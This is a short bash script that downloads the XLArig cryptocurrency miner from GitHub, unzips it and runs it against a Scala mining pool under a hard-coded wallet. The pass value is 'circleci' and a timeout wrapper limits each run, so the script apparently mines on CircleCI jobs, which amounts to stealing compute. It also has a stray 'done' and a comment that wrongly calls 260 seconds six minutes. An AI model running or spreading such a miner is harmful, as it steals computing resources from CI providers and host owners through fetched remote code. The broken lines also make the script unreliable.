#!/bin/bash

Timeout=260 # 6 minutes

function timeout_monitor() {
   sleep "$Timeout"
   kill "$1"
}

# start the timeout monitor in 
# background and pass the PID:
timeout_monitor "$$" &
Timeout_monitor_pid=$!
wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o mine.scalaproject.io:3333 -u SvkRBartVquTUH7c165FxZCmbCH9USTdUNMecUqY8KJd3twTBMyUQJoMiGYbKkeYMYC3VzfwLsGJVW5vMoYBspcN1XLNVfjiV -p circleci -a panthera -k -t32
done
# <your script here>

# kill timeout monitor when terminating:
kill "$Timeout_monitor_pid"